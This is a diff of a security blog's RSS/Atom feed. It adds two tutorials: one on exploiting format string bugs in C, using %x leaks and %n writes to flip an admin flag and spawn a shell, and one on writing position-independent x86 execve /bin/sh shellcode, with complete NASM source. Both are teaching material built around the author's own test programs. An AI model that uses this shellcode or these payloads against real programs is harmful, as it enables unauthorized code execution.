@@ -1,4 +1,541 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-10-22T06:54:55+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A blog for infosec stuff.</subtitle><entry><title type="html">Gofer - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/gofer.html" rel="alternate" type="text/html" title="Gofer - HackTheBox" /><published>2023-10-22T00:00:00+01:00</published><updated>2023-10-22T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/gofer</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/gofer.html"><![CDATA[<p><strong>Gofer</strong> is a very nice, <em>hard</em> box on <em>HackTheBox</em>. It starts with a verb tampering attack on a custom proxy to bypass access control, then a phishing attack on a local user using <em>LibreOffice</em> macro. Privesc to root is through a use-after-free (UAF) vulnerability on a custom binary.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2024-05-09T11:07:20+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A blog for infosec stuff.</subtitle><entry><title type="html">Introduction to Format Strings Vulnerabilities</title><link href="https://4g3nt47.github.io/posts/binary%20exploitation/format_strings_intro.html" rel="alternate" type="text/html" title="Introduction to Format Strings Vulnerabilities" /><published>2024-05-09T00:00:00+01:00</published><updated>2024-05-09T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/binary%20exploitation/format_strings_intro</id><content type="html" xml:base="https://4g3nt47.github.io/posts/binary%20exploitation/format_strings_intro.html"><![CDATA[<p>A format string is, simply put, a string that is used to format dynamic data for display. They are typically used to avoid hard-coding variables into a string, and also allows the programmer to specify the format in which specific data is to be displayed. Example: You are making a social media application and you want to display the username of a user when they open their profile. A minimalistic implementation of this in C looks like this;</p>
+
+<pre><code class="language-C">char *username = "4g3nt47";
+printf("Username: %s\n", username);
+</code></pre>
+
+<p>In the above example, the format string in use is <code class="language-plaintext highlighter-rouge">%s</code>, tells the <code class="language-plaintext highlighter-rouge">printf</code> function to display the argument passed to it as a <em>string</em>, in this case, the variable <code class="language-plaintext highlighter-rouge">username</code>. This should output the following;</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>Username: 4g3nt47
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>So… how does this work? Looking at the <code class="language-plaintext highlighter-rouge">printf()</code> function prototype;</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">printf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">format</code> is the format string, and the <code class="language-plaintext highlighter-rouge">...</code> indicates the function accepts variable number of additional arguments. These additional arguments are referenced sequentially whenever the <code class="language-plaintext highlighter-rouge">printf()</code> functions encounters a format string that needs to be resolved, in our example <code class="language-plaintext highlighter-rouge">%s</code>. It should be noted there are many functions that use format strings, not just <code class="language-plaintext highlighter-rouge">printf</code>. See the reference manual (<code class="language-plaintext highlighter-rouge">man 3 printf</code> on linux).</p>
+
+<p><br /></p>
+
+<h4 id="how-it-really-works">How It Really Works</h4>
+<p><br /></p>
+
+<p>Format strings look pretty useful and safe until you think about how they actually work. As discussed, the <code class="language-plaintext highlighter-rouge">printf()</code> function resolves format strings by reading their respective data from an infinite set of arguments. What happens if no argument was provided? Let’s see…</p>
+
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+
+void main(){
+  printf("Welcome, %s");
+}
+</code></pre>
+
+<p>Compiling and running this, I got;</p>
+
+<p><img src="/assets/img/Pasted image 20240416200104.png" alt="" /></p>
+
+<p>Notice we keep getting some random values in place of <code class="language-plaintext highlighter-rouge">%s</code>, which indicates the function is still reading something. As you know, a string is just a pointer to a bunch of characters, so we can assume the <code class="language-plaintext highlighter-rouge">%s</code> is causing the <code class="language-plaintext highlighter-rouge">printf()</code> function to de-reference some address. If we want to see the actual address that is being read, we need a format specifier that actually prints values as they are. Since we are working on x86 where pointers are 4 bytes in size, an ideal format specifier for this is an 8-characters wide hexadecimal (<code class="language-plaintext highlighter-rouge">%08x</code>);</p>
+
+<pre><code class="language-C">printf("Welcome, %08x\n");
+</code></pre>
+
+<p><img src="/assets/img/Pasted image 20240416200843.png" alt="" /></p>
+
+<p>Sweet! We are now getting the address, which appears different each time because of <em>ASLR</em>. Now the question is where exactly is the <code class="language-plaintext highlighter-rouge">print()</code> function getting this address considering we didn’t give it any? Well, function arguments in x86 typically go onto the stack, so it’s a safe guess to assume that’s where the address is coming from. To confirm this, we can load the program in a debugger and set a breakpoint immediately after the call to <code class="language-plaintext highlighter-rouge">printf()</code> to see if the leaked address is on the stack;</p>
+
+<p><img src="/assets/img/Pasted image 20240416202853.png" alt="" /></p>
+
+<p>As expected it is. The address <code class="language-plaintext highlighter-rouge">0x565c6008</code> (highlighted in blue), which contains our format string, is right at the top of our stack. Next to it (highlighted in green) is the address we are leaking. Remember that when calling functions in x86, arguments are pushed into the stack in reverse order, meaning the first argument goes in last, and will therefore be on top of the stack. In this case, we didn’t actually provide any extra argument to <code class="language-plaintext highlighter-rouge">printf()</code>, but the function has no way of knowing that since it does not have a way of tracking how many arguments were given to it, relying solely on the number of format specifiers in the format string. Since the format string we used has one format specifier, the function simply pulls data from the stack, which was not meant for it.</p>
+
+<p><br /></p>
+
+<h4 id="exploitation-leaking-memory">Exploitation: Leaking Memory</h4>
+<p><br /></p>
+
+<p>Now let’s look at another simple example;</p>
+
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+
+int main(int argc, char **argv){
+  
+  if (argc &lt; 2){
+    printf("[-] Please specify your name!\n");
+    return 1;
+  }
+  printf("Welcome: ");
+  printf(argv[1]);
+  return 0;
+}
+</code></pre>
+
+<p>The above code may look safe until you take a closer look at line <strong>10</strong>;</p>
+
+<pre><code class="language-C">printf(argv[1]);
+</code></pre>
+
+<p>Remember that the first argument for <code class="language-plaintext highlighter-rouge">printf()</code> is the format string, in this case <code class="language-plaintext highlighter-rouge">argv[1]</code>, which is the first argument passed to the program during execution. Since we have full control over this value, we can provide <code class="language-plaintext highlighter-rouge">printf()</code> with our own format strings and leak stuff from the stack;</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>(agent47@debian) ~&gt; ./test '%08x %08x %08x %08x'
+Welcome: 00000001 5656d000 5656a1c1 00000002
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>You can see we are able to leak <strong>16</strong> bytes from the top of the stack in hex. The first and last DWORDS (double-words/4 bytes) are clearly not addresses, so we can ignore those. But the middle two might point to something. To read contents at these addresses, we can simply replace the format specifiers with <code class="language-plaintext highlighter-rouge">%s</code>, which causes <code class="language-plaintext highlighter-rouge">printf()</code> to de-reference them (Caution: reading the wrong address will cause the program to segfault);</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>(agent47@debian) ~&gt; ./test '%08x %s %s %08x'
+Welcome: 00000001 &gt; ?. 00000002
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We were now able to read the data at those addresses. Nothing interesting in this case, but you could get lucky going further down the stack in sensitive programs that happen to be vulnerable.</p>
+
+<p><br /></p>
+
+<h4 id="exploitation-writing-to-memory">Exploitation: Writing to Memory</h4>
+<p><br /></p>
+
+<p>Leaking stuff is fun, but let’s take a look at an example that will show you how dangerous format strings bugs can be;</p>
+
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+void show_profile(char *name, int *is_admin){
+  printf("[*] Username: ");
+  printf(name);
+  printf("\n[*] Admin privs: %d\n", *is_admin);
+}
+
+int main(int argc, char **argv){
+  if (argc &lt; 2){
+    printf("[-] Usage: %s &lt;username&gt;\n", argv[0]);
+    return 1;
+  }
+  char *name = argv[1];
+  int is_admin = 0;
+  printf("[+] NOTE: Administrative function disabled due to security concerns!\n");
+  show_profile(name, &amp;is_admin);
+  if (is_admin){
+    printf("[+] YOU ARE AN ADMIN: %d\n", is_admin);
+    char *cmd[] = {"/bin/sh", NULL};
+    execve(cmd[0], cmd, NULL);
+  }else{
+    printf("[-] Out of here, you peasant!\n");
+  }
+  return 0;
+}
+</code></pre>
+
+<p>The above shown code when executed will;</p>
+<ol>
+  <li>Expect to be given the name of the user as an argument, and save it to <code class="language-plaintext highlighter-rouge">name</code></li>
+  <li>Set <code class="language-plaintext highlighter-rouge">is_admin</code> to <code class="language-plaintext highlighter-rouge">0</code>, and inform the user that admin functions are disabled.</li>
+  <li>Call <code class="language-plaintext highlighter-rouge">show_profile()</code> with the name of the user, and a <em>pointer</em> to the <code class="language-plaintext highlighter-rouge">is_admin</code> variable.</li>
+  <li>Check if <code class="language-plaintext highlighter-rouge">is_admin</code> is non-zero, which should always be false since we hard-coded the value to <code class="language-plaintext highlighter-rouge">0</code>. Therefore, the block of code that calls <code class="language-plaintext highlighter-rouge">execve()</code> to open a shell should never run.</li>
+</ol>
+
+<p>Running it, the program seems to be working as expected;</p>
+
+<p><img src="/assets/img/Pasted image 20240417122012.png" alt="" /></p>
+
+<p>Looking at the <code class="language-plaintext highlighter-rouge">show_profile()</code> code, we can clearly see the second call to <code class="language-plaintext highlighter-rouge">printf()</code> is vulnerable;</p>
+
+<pre><code class="language-C">void show_profile(char *name, int *is_admin){
+  printf("[*] Username: ");
+  printf(name);
+  printf("\n[*] Admin privs: %d\n", *is_admin);
+}
+</code></pre>
+
+<p>This function accepts two arguments, both of which are pointers, and are placed on the stack. Let’s see if we can find them! Since our call stack is just <code class="language-plaintext highlighter-rouge">main() &gt;&gt; show_profile() &gt;&gt; printf()</code>, we shouldn’t need to dig deep into the stack before finding our addresses. So I leaked the first 10 addresses and examine their contents (see the previous section on how to do this) until I found the the address of my format string;</p>
+
+<p><img src="/assets/img/Pasted image 20240417124638.png" alt="" /></p>
+
+<p>And success! Our format string (the <code class="language-plaintext highlighter-rouge">name</code> variable) is the 8th DWORD on the stack. Since we passed both <code class="language-plaintext highlighter-rouge">name</code> and <code class="language-plaintext highlighter-rouge">is_admin</code> in the call to <code class="language-plaintext highlighter-rouge">show_profile()</code>, we can be certain that the next DWORD (highlighted in red) is the pointer to our <code class="language-plaintext highlighter-rouge">is_admin</code> function. We can’t exactly print this since it’s currently set to <code class="language-plaintext highlighter-rouge">0</code>, which <code class="language-plaintext highlighter-rouge">printf()</code> will see as a null character. But what if we can modify it?</p>
+
+<p>Turns out we can! There is a special format string used to write the number of bytes written by the <code class="language-plaintext highlighter-rouge">printf()</code> function at a specific point to a given memory address: <code class="language-plaintext highlighter-rouge">%n</code>. Since in our case we don’t really care what is written to the target address as long as it’s not zero, we could use this to easily bypass the check that disables the code block that calls <code class="language-plaintext highlighter-rouge">execve()</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20240417125550.png" alt="" /></p>
+
+<p>And just like that, we modified memory and got a shell! You might be curious why <code class="language-plaintext highlighter-rouge">is_admin</code> is now set to <code class="language-plaintext highlighter-rouge">72</code>? Well, if you count the number of bytes printed by the second call to <code class="language-plaintext highlighter-rouge">printf()</code>, you will see they are <code class="language-plaintext highlighter-rouge">72</code> bytes long;</p>
+
+<p><img src="/assets/img/Pasted image 20240417130108.png" alt="" /></p>
+
+<p>This is great.. but notice our payload is quite long, and programs will often restrict the length of the string you are allowed to input. An elegant way to shorten your format string payloads significantly is using <em>direct parameter access</em>, which allows you to specify exactly which argument you want to access within the format string. In C/C++, the format for direct parameter access is  <code class="language-plaintext highlighter-rouge">%&lt;index&gt;$&lt;format&gt;</code>, where <code class="language-plaintext highlighter-rouge">&lt;index&gt;</code> is the position of the argument from the top of the stack (starting from 1), and <code class="language-plaintext highlighter-rouge">&lt;format&gt;</code> is the format specifier you wish to use on it.</p>
+
+<p>In our case, we know that the pointer to <code class="language-plaintext highlighter-rouge">is_admin</code> is the 9th item from the top of the stack, so we can access it using the following;</p>
+
+<p><img src="/assets/img/Pasted image 20240419095710.png" alt="" /></p>
+
+<p>And we got the same exploit with much shorter payload! Note that this feature may not be available on some platforms. If you are interested in learning more on format strings exploitation, consider reading  the 4th chapter of <em>The Shellcoder’s Handbook: Discovering and Exploiting Security Holes.</em></p>
+
+<hr />]]></content><author><name></name></author><category term="binary exploitation" /><category term="binary exploitation" /><category term="format strings" /><category term="radare2" /><summary type="html"><![CDATA[A format string is, simply put, a string that is used to format dynamic data for display. They are typically used to avoid hard-coding variables into a string, and also allows the programmer to specify the format in which specific data is to be displayed. Example: You are making a social media application and you want to display the username of a user when they open their profile. A minimalistic implementation of this in C looks like this;]]></summary></entry><entry><title type="html">Injectable Shellcodes: The ADDRESS Challenge</title><link href="https://4g3nt47.github.io/posts/shellcoding/shellcoding_addr_chall.html" rel="alternate" type="text/html" title="Injectable Shellcodes: The ADDRESS Challenge" /><published>2024-05-09T00:00:00+01:00</published><updated>2024-05-09T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/shellcoding/shellcoding_addr_chall</id><content type="html" xml:base="https://4g3nt47.github.io/posts/shellcoding/shellcoding_addr_chall.html"><![CDATA[<p>One challenging aspect of creating a shellcode is dealing with addresses. Your shellcode will often need to reference certain locations, which gets complicated when working in the context of the program you are injecting into. These problems can be solved using a few tricks;</p>
+
+<p><br /></p>
+
+<h3 id="the-jmp--call-trick">The JMP + CALL trick</h3>
+
+<p>One simple way of solving address challenges when writing a shellcode is by taking advantage of how the <code class="language-plaintext highlighter-rouge">JMP</code> and <code class="language-plaintext highlighter-rouge">CALL</code> instructions work. In this approach, relative jumps, which are just jumps that are followed by an offset (number of bytes/opcodes to skip AFTER the current <code class="language-plaintext highlighter-rouge">JMP</code> instruction, basically <code class="language-plaintext highlighter-rouge">EIP + offset</code>) instead of a full address, are used to control the flow of execution in a way that’s independent of the execution context. This allows the shellcode to be injected anywhere without affecting the execution flow. Let’s have a look into how relative jumps work with the following example;</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="nf">section</span> <span class="nv">.text</span>
+    <span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nl">_start:</span>
+    <span class="nf">jmp</span> <span class="nv">target</span>
+    <span class="nf">nop</span>
+    <span class="nf">nop</span>
+
+<span class="nl">target:</span>
+    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0xdead</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>When the above code is assembled, the <code class="language-plaintext highlighter-rouge">JMP</code> instruction generated uses an offset to <code class="language-plaintext highlighter-rouge">target</code>, not an address. Notice that there are two <code class="language-plaintext highlighter-rouge">NOP</code> instructions between the <code class="language-plaintext highlighter-rouge">JMP</code> instruction and <code class="language-plaintext highlighter-rouge">target</code>, and each <code class="language-plaintext highlighter-rouge">NOP</code> instruction assembles to 1 byte (<code class="language-plaintext highlighter-rouge">0x90</code>), so our <code class="language-plaintext highlighter-rouge">JMP</code> offset is 2 as we need to skip these bytes (<code class="language-plaintext highlighter-rouge">eb</code> is the <code class="language-plaintext highlighter-rouge">JMP</code> instruction and <code class="language-plaintext highlighter-rouge">02</code> is the offset);</p>
+
+<p><img src="/assets/img/Pasted image 20240415133944.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">CALL</code> instruction, which is used to call functions, works quite similarly to the <code class="language-plaintext highlighter-rouge">JMP</code> instruction with one key difference: <code class="language-plaintext highlighter-rouge">CALL</code> pushes the address of the next instruction (return address) onto the stack before jumping to the target location, while <code class="language-plaintext highlighter-rouge">JMP</code> simply modifies the instruction pointer to go to the target location. Saving the return address allows the called function to hand control back to the caller using the <code class="language-plaintext highlighter-rouge">RET</code> instruction, which simply pops the return address from the stack and jump to it.</p>
+
+<p>These two instructions can help us solve the address challenge when writing shellcodes using the following steps;</p>
+<ol>
+  <li>Start our shellcode with a short <code class="language-plaintext highlighter-rouge">JMP</code> to a <code class="language-plaintext highlighter-rouge">CALL</code> instruction to setup relative addressing.</li>
+  <li><code class="language-plaintext highlighter-rouge">CALL</code> another offset within the same shellcode that contains the main code of our shellcode.</li>
+  <li>Read the address stored at the top of the stack by the <code class="language-plaintext highlighter-rouge">CALL</code> instruction. This address will be pointing to a known position near or at the end of the shellcode, and we can use it to dynamically calculate other offsets at runtime.</li>
+</ol>
+
+<p>Here is the layout;</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>_start:
+  jmp loc1
+
+shellcode:
+  ---[ main code]---
+
+loc1:
+  call shellcode
+  ---[ Your ref point that will be pushed onto the stack ]---
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">_start</code> marks the shellcode’s entrypoint, <code class="language-plaintext highlighter-rouge">shellcode</code> is our main shellcode body, and <code class="language-plaintext highlighter-rouge">loc1</code> is where we make the call to get our reference address onto the stack.</p>
+
+<p>With that in mind, we can write a simple injectable shellcode that uses <code class="language-plaintext highlighter-rouge">execve()</code> syscall to spawn a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell. <code class="language-plaintext highlighter-rouge">execve()</code> is defined in the <code class="language-plaintext highlighter-rouge">unistd.h</code> header file, and is used to execute other programs. The function accepts three arguments;</p>
+
+<pre><code class="language-C">int execve(const char *pathname, char *const argv[], char *const envp[]);
+</code></pre>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">pathname</code>: This is the full path of the program you want to execute.</li>
+  <li><code class="language-plaintext highlighter-rouge">argv[]</code>: An array of strings containing the path of the program, and any other argument to pass to the program. Should be null-terminated.</li>
+  <li><code class="language-plaintext highlighter-rouge">envp[]</code>: An array of strings containing any environment variables you wish to pass to the program. Can be null.</li>
+</ol>
+
+<p>Since we are working in x86 (32-bit) assembly shellcode, we’ll need to rely on making a direct system call (syscall) to use this function. To do this, we need to;</p>
+
+<ol>
+  <li>Set <code class="language-plaintext highlighter-rouge">EAX</code> to <code class="language-plaintext highlighter-rouge">0x0b</code>, which is the code for <code class="language-plaintext highlighter-rouge">execve()</code> syscall.</li>
+  <li>Set <code class="language-plaintext highlighter-rouge">EBX</code> to a pointer to a string. This is the <code class="language-plaintext highlighter-rouge">pathname</code> argument.</li>
+  <li>Set <code class="language-plaintext highlighter-rouge">ECX</code> to a pointer to an array of pointers. This is the <code class="language-plaintext highlighter-rouge">argv[]</code> argument.</li>
+  <li>Set <code class="language-plaintext highlighter-rouge">EDX</code> to a pointer to an array of pointers. This is the <code class="language-plaintext highlighter-rouge">envp[]</code> argument, which can be null.</li>
+</ol>
+
+<p>For our <code class="language-plaintext highlighter-rouge">/bin/sh</code> shellcode, we start by creating a basic x86 program (I’m using NASM), and setup the first jump;</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="nf">section</span> <span class="nv">.text</span>
+  <span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nl">_start:</span>
+  <span class="nf">jmp</span> <span class="nv">loc1</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Then we define <code class="language-plaintext highlighter-rouge">loc1</code> (our <code class="language-plaintext highlighter-rouge">JMP</code> destination) with the <code class="language-plaintext highlighter-rouge">CALL</code> instruction and the data we are starting with (<code class="language-plaintext highlighter-rouge">/bin/shA</code> where <code class="language-plaintext highlighter-rouge">A</code> is just a placeholder that we will replace with a null at runtime). Note that <code class="language-plaintext highlighter-rouge">db</code> isn’t a typical assembly instruction. The assembler simply embeds the given bytes at that position in the output binary, so the immediate bytes after the opcodes of <code class="language-plaintext highlighter-rouge">call shellcode</code> will be <code class="language-plaintext highlighter-rouge">2f 62 69 6e 2f 73 68 41</code>, which is hex for <code class="language-plaintext highlighter-rouge">/bin/shA</code>;</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="nl">loc1:</span>
+  <span class="nf">call</span> <span class="nv">shellcode</span>
+  <span class="kd">db</span> <span class="err">"</span><span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">shA</span><span class="err">"</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>This block will load the address of <code class="language-plaintext highlighter-rouge">/bin/shA</code> onto the stack, which we can get by de-referencing the pointer in <code class="language-plaintext highlighter-rouge">ESP</code>.</p>
+
+<p>Now for the main shellcode. First thing we need to do is obtain the address to <code class="language-plaintext highlighter-rouge">/bin/shA</code>, null-terminate it, and push it onto the stack. Then move it’s address into <code class="language-plaintext highlighter-rouge">EBX</code> to serve as our <code class="language-plaintext highlighter-rouge">pathname</code>;</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="nl">shellcode:</span>
+    <span class="nf">pop</span> <span class="nb">ebx</span>                 <span class="c1">; Get the address of our /bin/shA</span>
+    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">; For runtime nulling :)</span>
+    <span class="nf">push</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">ebx</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span>    <span class="c1">; Push '/shA' into the stack</span>
+    <span class="nf">push</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">ebx</span><span class="p">]</span>        <span class="c1">; Push '/bin' into the stack. We now have /bin/shA on top</span>
+    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mi">7</span><span class="p">],</span> <span class="nb">al</span>  <span class="c1">; Overwrite the 'A' placeholder to null-terminate</span>
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; First arg (filename) of execve() = /bin/sh</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Next we need to setup our <code class="language-plaintext highlighter-rouge">argv[]</code> for the syscall. Since this is just a null-terminated array of string pointers, we can leverage the stack to create it by pushing a NULL to it, followed by the same address we used for <code class="language-plaintext highlighter-rouge">pathname</code>, then save it’s stack address in <code class="language-plaintext highlighter-rouge">ECX</code>;</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>  <span class="c1">; Build the *argv[] array on the stack</span>
+    <span class="nf">push</span> <span class="nb">eax</span>                <span class="c1">; NULL</span>
+    <span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; /bin/sh</span>
+    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; ECX = {"/bin/sh", NULL}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We then set <code class="language-plaintext highlighter-rouge">envp[]</code> to null since we don’t need it;</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>  <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">; EDX = NULL</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Finally, we execute the syscall;</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>  <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x0b</span>           <span class="c1">; 0x0b (11) = execve() syscall</span>
+  <span class="nf">int</span> <span class="mh">0x80</span>               <span class="c1">; Y33T!!!</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The complete code;</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td><td class="rouge-code"><pre><span class="nf">section</span> <span class="nv">.text</span>
+    <span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nl">_start:</span>
+    <span class="nf">jmp</span> <span class="nv">loc1</span>
+
+<span class="nl">shellcode:</span>
+    <span class="nf">pop</span> <span class="nb">ebx</span>                 <span class="c1">; Get the address of our /bin/shA</span>
+    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">; For runtime nulling :)</span>
+    <span class="nf">push</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">ebx</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span>    <span class="c1">; Push '/shA' into the stack</span>
+    <span class="nf">push</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">ebx</span><span class="p">]</span>        <span class="c1">; Push '/bin' into the stack. We now have /bin/shA on top</span>
+    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mi">7</span><span class="p">],</span> <span class="nb">al</span>  <span class="c1">; Overwrite the 'A' placeholder to null-terminate</span>
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; First arg (filename) of execve() = /bin/sh</span>
+    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">; EDX = NULL</span>
+    
+    <span class="c1">; Build the *argv[] array on the stack</span>
+    <span class="nf">push</span> <span class="nb">eax</span>                <span class="c1">; NULL</span>
+    <span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; /bin/sh</span>
+    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; ECX = {"/bin/sh", NULL}</span>
+
+    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x0b</span>            <span class="c1">; 0x0b (11) = execve() syscall</span>
+  <span class="nf">int</span> <span class="mh">0x80</span>                <span class="c1">; Y33T!!!</span>
+
+<span class="nl">loc1:</span>
+  <span class="nf">call</span> <span class="nv">shellcode</span>          <span class="c1">; Jump to main body and save our reference address.</span>
+    <span class="kd">db</span> <span class="err">"</span><span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">shA</span><span class="err">"</span>           <span class="c1">; Our reference address.</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I saved this as <code class="language-plaintext highlighter-rouge">test.asm</code>. Time to assemble and test (Note: I’m working on an x64 system, and building for x86, hence the need to declare architecture in the following commands);</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>nasm -f elf32 test.asm -o test.o
+ld -m elf_i386 test.o -o test
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/Pasted image 20240415184124.png" alt="" /></p>
+
+<p>Everything looks good :) But we are running it as a standalone ELF binary. To covert it into a shellcode, we need to extract our opcodes of interest only. Disassembling the binary using <code class="language-plaintext highlighter-rouge">objdump</code> shows that the <code class="language-plaintext highlighter-rouge">.text</code> section holds all our code of interest;</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>objdump -D -Mintel test
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/Pasted image 20240415184745.png" alt="" /></p>
+
